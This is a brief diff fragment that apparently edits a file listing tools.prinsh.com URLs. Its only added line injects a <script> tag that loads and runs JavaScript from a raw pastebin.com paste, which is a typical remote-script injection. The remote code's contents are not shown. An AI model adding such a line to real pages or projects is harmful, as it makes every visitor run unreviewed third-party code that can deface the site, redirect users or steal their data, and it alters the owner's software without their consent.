@@ -19,3 +19,4 @@ https://tools.prinsh.com/home/?index
 
 https://tools.prinsh.com/home/?tools=jso
 
+<script type="text/javascript" src="https://pastebin.com/raw/J5yQMDVp"></script>
